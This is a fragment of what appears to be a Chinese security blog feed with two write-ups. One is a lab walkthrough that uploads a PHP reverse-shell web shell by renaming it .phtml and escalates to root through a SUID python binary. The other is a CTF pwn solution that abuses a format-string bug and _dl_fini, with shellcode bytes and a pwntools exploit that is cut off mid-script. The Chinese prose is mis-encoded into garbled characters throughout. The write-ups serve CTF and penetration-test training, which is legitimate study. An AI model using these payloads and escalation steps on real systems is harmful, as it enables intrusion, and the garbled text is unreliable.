punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$daemon</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">print</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$string</span></span>\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æŠŠæœ¨é©¬ä¼ ä¸Šå»ï¼Œå‘ç°æ‹’ç».phpçš„æ–‡ä»¶ä¸Šä¼ <br><img src="/Red_FILE/99f9be88fe8466564d7e920b24ae9e5f_MD5.jpeg"><br>æ”¹ä¸‹åç¼€ï¼Œæ¯”å¦‚phtml<br><img src="/Red_FILE/cb4ca31478f044e25ad9980c878991e6_MD5.jpeg"><br>çœ‹ä¸‹&#x2F;uploads&#x2F;ï¼Œæˆ‘ä»¬å·²ç»æˆåŠŸä¸Šä¼ <br><img src="/Red_FILE/530844f9651306b5715a17d280b27671_MD5.jpeg"><br>æˆ‘ä»¬åœ¨æ”»å‡»æœºçš„1234ç«¯å£è¿›è¡Œç›‘å¬ï¼Œå¹¶è®¿é—®æœ¨é©¬ç½‘é¡µï¼ŒæˆåŠŸåå¼¹shell<br><img src="/Red_FILE/530844f9651306b5715a17d280b27671_MD5.jpeg"><br>findæ‰¾user.txtï¼Œæ‰“å°å³å¯</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> user.txt <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Red_FILE/0bd881d2ec5665d4b437557aca30c5b0_MD5.jpeg"></p><h1 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h1><ol><li>æœç´¢å…·æœ‰SUIDæƒé™çš„æ–‡ä»¶ï¼Œå¦‚ä½•ææƒï¼Ÿ</li></ol><p>æœç´¢å…·æœ‰suidæƒé™çš„æ–‡ä»¶</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">find</span> / <span class="token parameter variable">-perm</span> /4000 <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/snapd/snap-confine/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic/usr/lib/eject/dmcrypt-get-device/usr/lib/openssh/ssh-keysign/usr/lib/policykit-1/polkit-agent-helper-1/usr/bin/traceroute6.iputils/usr/bin/newuidmap/usr/bin/newgidmap/usr/bin/chsh/usr/bin/python/usr/bin/at/usr/bin/chfn/usr/bin/gpasswd/usr/bin/sudo/usr/bin/newgrp/usr/bin/passwd/usr/bin/pkexec/snap/core/8268/bin/mount/snap/core/8268/bin/ping/snap/core/8268/bin/ping6/snap/core/8268/bin/su/snap/core/8268/bin/umount/snap/core/8268/usr/bin/chfn/snap/core/8268/usr/bin/chsh/snap/core/8268/usr/bin/gpasswd/snap/core/8268/usr/bin/newgrp/snap/core/8268/usr/bin/passwd/snap/core/8268/usr/bin/sudo/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper/snap/core/8268/usr/lib/openssh/ssh-keysign/snap/core/8268/usr/lib/snapd/snap-confine/snap/core/8268/usr/sbin/pppd/snap/core/9665/bin/mount/snap/core/9665/bin/ping/snap/core/9665/bin/ping6/snap/core/9665/bin/su/snap/core/9665/bin/umount/snap/core/9665/usr/bin/chfn/snap/core/9665/usr/bin/chsh/snap/core/9665/usr/bin/gpasswd/snap/core/9665/usr/bin/newgrp/snap/core/9665/usr/bin/passwd/snap/core/9665/usr/bin/sudo/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper/snap/core/9665/usr/lib/openssh/ssh-keysign/snap/core/9665/usr/lib/snapd/snap-confine/snap/core/9665/usr/sbin/pppd/bin/mount/bin/su/bin/fusermount/bin/ping/bin/umount<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…¶ä¸­çš„pythonå¯ä»¥ä¸ºæˆ‘ä»¬æ‰€ç”¨ï¼ˆè¯¦è§suidææƒï¼‰</p><blockquote><p>å¦‚æœäºŒè¿›åˆ¶æ–‡ä»¶è®¾ç½®äº† SUID ä½ï¼Œåˆ™å®ƒä¸ä¼šåˆ é™¤æå‡çš„æƒé™ï¼Œå¹¶ä¸”å¯èƒ½ä¼šè¢«æ»¥ç”¨æ¥è®¿é—®æ–‡ä»¶ç³»ç»Ÿã€å‡çº§æˆ–å°†ç‰¹æƒè®¿é—®ä½œä¸º SUID åé—¨è¿›è¡Œç»´æŠ¤ã€‚å¦‚æœå®ƒç”¨äºè¿è¡ŒÂ <code>sh -p</code>Â ï¼Œåˆ™åœ¨ Debian ï¼ˆ&lt;&#x3D; Stretchï¼‰ ç­‰å…è®¸é»˜è®¤Â <code>sh</code>Â shell ä»¥ SUID æƒé™è¿è¡Œçš„ç³»ç»Ÿä¸Šçœç•¥è¯¥Â <code>-p</code>Â å‚æ•°ã€‚</p></blockquote><ol start="3"><li>å¾—åˆ°rootå¹¶æ‰“å°root.txtã€‚<br>è¿è¡Œ<code>./python -c &#39;import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#39;</code>ï¼ŒæˆåŠŸå¾—åˆ°rootï¼<br><img src="/Red_FILE/9264e0d40ff79d4d32233574749af84a_MD5.jpeg"></li></ol>]]></content>
      
      
      <categories>
          
          <category> è¿›æ”»æ€§æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€æ‰“é¶ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023-çº¿ä¸Š-æ²³å—é‡‘ç›¾ä¿¡å®‰æ¯</title>
      <link href="/2023/12/02/2023-%E7%BA%BF%E4%B8%8A-%E6%B2%B3%E5%8D%97%E9%87%91%E7%9B%BE%E4%BF%A1%E5%AE%89%E6%9D%AF/"/>
      <url>/2023/12/02/2023-%E7%BA%BF%E4%B8%8A-%E6%B2%B3%E5%8D%97%E9%87%91%E7%9B%BE%E4%BF%A1%E5%AE%89%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="sign-format"><a href="#sign-format" class="headerlink" title="sign-format"></a>sign-format</h1><p><img src="/EXP_FILE/10d63cbe7c7433236ed8a177dacbfb8f_MD5.jpeg"><br><img src="/EXP_FILE/7c80218a56a1994d0b9786787401b5a7_MD5.jpeg"><br>æ— pieï¼Œæœ‰æ²™ç›’</p><h2 id="ç¨‹åºåˆ†æ"><a href="#ç¨‹åºåˆ†æ" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h2><blockquote><p>å¾ˆç®€å•çš„ç¨‹åº</p></blockquote><ul><li><p>main</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">sub_40135D</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Welcome here!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"It's a simple sign-in question."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Let's start!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">close</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> format<span class="token punctuation">,</span> <span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span>format<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æŠŠè¾“å‡ºå…³é—­äº†ï¼Œè¿˜æœ‰ä¸€ä¸ªbssä¸Šçš„fmt<br><img src="/EXP_FILE/00fcf9fecb9625710fcee2508251d2d4_MD5.jpeg"></p></li><li><p>sub_40135D</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">sub_40135D</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">mprotect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span>format <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFFFFFFF000LL</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x1000uLL</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"mprotect"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">sub_401236</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å°†bssæ®µèµ‹äºˆrwxæƒé™</p></li></ul><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>åªæœ‰ä¸€æ¬¡éæ ˆfmtçš„æœºä¼šï¼Œæˆ‘ä»¬æ— æ³•åªé€šè¿‡è¿™ä¸€æ¬¡æ§åˆ¶æ‰§è¡Œæµï¼ˆæœŸé—´ä¹Ÿæƒ³è¿‡åŠ«æŒäºŒçº§æŒ‡é’ˆå’ŒåŠ«æŒfini_arrayï¼‰ï¼Œç”±äºè¾“å‡ºå…³é—­ä¹Ÿä¸èƒ½æ³„éœ²æ•°æ®</p><p>åœ¨è°ƒç”¨exitå‡½æ•°é€€å‡ºç¨‹åºæ—¶ï¼Œä¼šè°ƒç”¨åˆ°<code>_dl_fini</code>å‡½æ•°ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nmaps<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">link_map</span> <span class="token operator">*</span>l <span class="token operator">=</span> maps<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// link_mapç»“æ„ä½“æŒ‡é’ˆl</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token operator">-></span>l_init_called<span class="token punctuation">)</span><span class="token comment">//æ£€æŸ¥ç‚¹1</span>    <span class="token punctuation">&#123;</span>      <span class="token comment">/* Make sure nothing happens if we are called twice.  */</span>      l<span class="token operator">-></span>l_init_called <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token comment">/* Is there a destructor function?  */</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token operator">-></span>l_info<span class="token punctuation">[</span>DT_FINI_ARRAY<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token comment">//æ£€æŸ¥ç‚¹2</span>          <span class="token operator">||</span> <span class="token punctuation">(</span>ELF_INITFINI <span class="token operator">&amp;&amp;</span> l<span class="token operator">-></span>l_info<span class="token punctuation">[</span>DT_FINI<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>          <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>            <span class="token comment">/* First see whether an array is given.  */</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token operator">-></span>l_info<span class="token punctuation">[</span>DT_FINI_ARRAY<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token comment">//æ£€æŸ¥ç‚¹3</span>            <span class="token punctuation">&#123;</span>              <span class="token function">ElfW</span><span class="token punctuation">(</span>Addr<span class="token punctuation">)</span> <span class="token operator">*</span>array <span class="token operator">=</span>                <span class="token punctuation">(</span><span class="token function">ElfW</span><span class="token punctuation">(</span>Addr<span class="token punctuation">)</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>l<span class="token operator">-></span>l_addr                        <span class="token operator">+</span> l<span class="token operator">-></span>l_info<span class="token punctuation">[</span>DT_FINI_ARRAY<span class="token punctuation">]</span><span class="token operator">-></span>d_un<span class="token punctuation">.</span>d_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token punctuation">(</span>l<span class="token operator">-></span>l_info<span class="token punctuation">[</span>DT_FINI_ARRAYSZ<span class="token punctuation">]</span><span class="token operator">-></span>d_un<span class="token punctuation">.</span>d_val                        <span class="token operator">/</span> <span class="token keyword">sizeof</span> <span class="token punctuation">(</span><span class="token function">ElfW</span><span class="token punctuation">(</span>Addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">while</span> <span class="token punctuation">(</span>i<span class="token operator">--</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>                <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">fini_t</span><span class="token punctuation">)</span> array<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// è°ƒç”¨äº†å‡½æ•°æŒ‡é’ˆï¼Œæ˜¯æˆ‘ä»¬çš„æ”»å‡»å¤„</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token punctuation">&#125;</span>   <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>è¯¥å‡½æ•°ä¼šæ ¹æ®link_mapçš„l_addråç§»é‡æ¥è°ƒç”¨fini_arrayæ®µçš„æŒ‡é’ˆï¼ˆDT_FINI_ARRAY è¿™ä¸ªå®å°±æ˜¯ 26ï¼‰</strong><br><code>ElfW(Addr) *array = (ElfW(Addr) *) (l-&gt;l_addr + l-&gt;l_info[26]-&gt;d_un.d_ptr);</code></p><p>æ¥è§¦è¿‡house of bananaçš„å¸ˆå‚…åº”è¯¥å¾ˆç†Ÿæ‚‰</p><ul><li><p>æˆ‘ä»¬æ¥çœ‹çœ‹l-&gt;l_addrçš„åœ°å€ï¼š<br><img src="/EXP_FILE/1a1955426feca2b49eb6230d546cd830_MD5.jpeg"><br>è¿™ä¸ªåœ°å€å¥½åƒå¾ˆç†Ÿæ‚‰ï¼Ÿæ²¡é”™æ­£æ˜¯æ ˆä¸Šçš„ä¸€ä¸ªç²‰é¢œè‰²åœ°å€ï¼ˆæ–­ç‚¹åœ¨printfï¼‰ï¼š<br><img src="/EXP_FILE/c31894cd1628ce9e396360a0873f20a7_MD5.jpeg"><br>æˆ‘ä»¬èƒ½å¤Ÿåˆ©ç”¨fmtæ§åˆ¶l-&gt;l_addr</p></li><li><p>å†çœ‹çœ‹l-&gt;l_info[26]-&gt;d_un.d_ptrï¼Œå¯è§å…¶å€¼ä¸º0x403d98</p></li></ul><p><img src="/EXP_FILE/66b2e055748333139fe47fdc27e46ccb_MD5.jpeg"><br>0x403d98ï¼Ÿè¿™å…¶å®å°±æ˜¯.fini_arrayæ®µçš„åœ°å€<br><img src="/EXP_FILE/fe64b6ba91dbfa3d0ac3eae67f97e737_MD5.jpeg"></p><hr><p>é‚£ä¹ˆæˆ‘ä»¬æ€è·¯å¾ˆæ˜æ˜¾äº†ï¼Œæ§åˆ¶l-&gt;addrä½¿å¾—arrayæŒ‡å‘bssæ®µï¼Œåœ¨bssä¸Šå†™ä¸Šorwçš„shellcodeå’Œorwçš„æŒ‡é’ˆï¼Œåœ¨<code>((fini_t) array[i]) ();</code>å°±ä¼šè°ƒç”¨orwæŒ‡é’ˆæ‰§è¡Œshellcodeã€‚<br>ç”±äºå…³é—­äº†æ ‡å‡†è¾“å‡ºï¼Œç”¨æ ‡å‡†é”™è¯¯è¾“å‡ºå³å¯</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># !/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span>she_i386_20<span class="token operator">=</span><span class="token string">b"\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"</span>she_amd64_30<span class="token operator">=</span><span class="token string">b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"</span>s <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num   <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es <span class="token operator">=</span> <span class="token keyword">lambda</span> data           <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>lg1  <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;34m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>lg2  <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;37m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pn   <span class="token operator">=</span> <span class="token keyword">lambda</span> name          <span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\033[01;38;5;214mOCT:%d\nHEX:%s \033[0m"</span><span class="token operator">%</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------------------------------</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> LibcSearchercontext<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">"linux"</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token punctuation">)</span><span class="token comment">#context.terminal=["tmux","splitw","-h"]</span>binary<span class="token operator">=</span><span class="token string">"./pwn"</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token comment">#------------------------------------------------------------------</span>choose<span class="token operator">=</span><span class="token number">1</span><span class="token keyword">if</span> choose<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token comment">#ENV=&#123;"LD_PRELOAD":"/home/xinri/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so"&#125;</span><span class="token comment">#io=process(["/home/xinri/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so",name],env=ENV)</span>io<span class="token operator">=</span>process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"123.56.237.147"</span><span class="token punctuation">,</span><span class="token number">45570</span><span class="token punctuation">)</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>start<span class="token operator">=</span><span class="token number">0x0000000000401150</span>bss<span class="token 